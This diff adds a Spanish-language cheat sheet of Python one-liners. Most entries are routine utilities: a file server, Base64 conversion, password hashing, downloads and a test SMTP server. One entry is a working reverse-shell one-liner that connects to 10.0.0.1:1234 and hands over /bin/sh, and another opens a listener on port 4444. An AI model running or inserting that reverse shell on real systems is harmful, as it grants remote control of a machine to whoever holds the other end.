@@ -1,0 +1,31 @@
+▶ Servidor HTTP Simple (Compartir archivos):
+  python3 -m http.server 8000
+
+▶ Reverse Shell en una línea (Conexión remota):
+  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+
+▶ Codificar en Base64 (Texto a Base64):
+  python3 -c "import base64; print(base64.b64encode(b'texto').decode())"
+
+▶ Decodificar Base64 (Base64 a texto):
+  python3 -c "import base64; print(base64.b64decode('dGV4dG8=').decode())"
+
+▶ Ejecutar Comando del Sistema (Ejecutar shell):
+  python3 -c "import os; os.system('ls -la')"
+
+▶ Servidor SMTP para Pruebas (Simular correo):
+  python3 -m smtpd -n -c DebuggingServer localhost:25
+
+▶ Generar Contraseña Hash (Hash SHA512):
+  python3 -c "import crypt; print(crypt.crypt('password', crypt.mksalt(crypt.METHOD_SHA512)))"
+
+▶ Descargar Archivo (Obtener desde URL):
+  python3 -c "import urllib.request; urllib.request.urlretrieve('http://example.com/file.txt', 'file.txt')"
+
+▶ Escuchar Puerto (Simple socket server):
+  python3 -c "import socket; s=socket.socket(); s.bind(('0.0.0.0',4444)); s.listen(1); c,a=s.accept(); print(f'Conectado: {a}'); c.close()"
+
+# Ejemplo de uso:
+# python3 -m http.server 8000
+# Este comando inicia un servidor HTTP simple en el puerto 8000, útil para transferir archivos rápidamente.
+# NOTA DE PRECAUCIÓN: El servidor HTTP simple no tiene autenticación ni cifrado. Úsalo solo en redes confiables y para transferencias temporales.
